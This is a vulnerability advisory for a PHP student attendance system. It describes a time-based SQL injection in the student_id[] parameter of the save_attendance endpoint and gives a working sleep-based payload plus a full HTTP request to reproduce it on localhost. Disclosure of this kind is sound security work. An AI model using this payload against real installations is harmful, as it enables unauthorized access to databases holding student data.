# Simple Student Attendance System has a vulnerability of SQL injection
Source code download：https://www.sourcecodester.com/php/17018/simple-student-attendance-system-using-php-and-mysql.html

version：2023/11/30

Vulnerability description: The system has a SQL injection vulnerability, and attackers can obtain database information and website control permissions by inserting malicious SQL statements.

The cause of the vulnerability: The vulnerability occurs on line 165 of classes\actions.class.php. The input from the user has not been filtered, resulting in the execution of malicious SQL statements
![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312111608669.jpg)
Vulnerability verification: After setting up the system, access the local port 80
![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312111609232.png)
At the attendance function, capture and save the traffic package for attendance
![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312111609233.png)
Pass the payload in the student_id[] parameter:
```php
83'and(select*from(select+sleep(3))a/**/union/**/select+1)='
```

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312111609234.png)

The response will pause for a multiple of 3 seconds, which is 6 seconds, successfully verifying that there is a SQL injection vulnerability at this location.

payload:

```php
POST /php-attendance/ajax-api.php?action=save_attendance HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 150
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=rbh6d8kdgfbbvame4b8ul5ujmn
Referer: http://127.0.0.1/php-attendance/?page=attendance&class_id=1&class_date=2023-12-05
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

class_date=2023-12-05&class_id=1&student_id%5B%5D=83%27and%28select%2Afrom%28select%2Bsleep%283%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27
```

sqlmap verification：

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312111609236.png)
